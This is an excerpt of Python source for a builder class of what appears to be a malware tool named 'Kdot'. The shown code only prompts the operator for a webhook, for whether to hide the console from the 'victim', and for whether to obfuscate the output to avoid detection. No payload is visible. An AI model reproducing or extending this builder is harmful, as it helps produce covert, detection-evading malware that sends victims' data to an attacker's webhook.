...
class Builder:
    def __init__(self) -> None:
        ...
        self.webhook = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} {Fore.RED}Enter your webhook:{Fore.BLUE} "
        )
        ...
        self.hider = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide Kdot console for victim? (yes/no): "
        )
        ...
        self.obfuscation = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the Kdot (recommand no if yes script will be detected)? (yes/no): "
        )
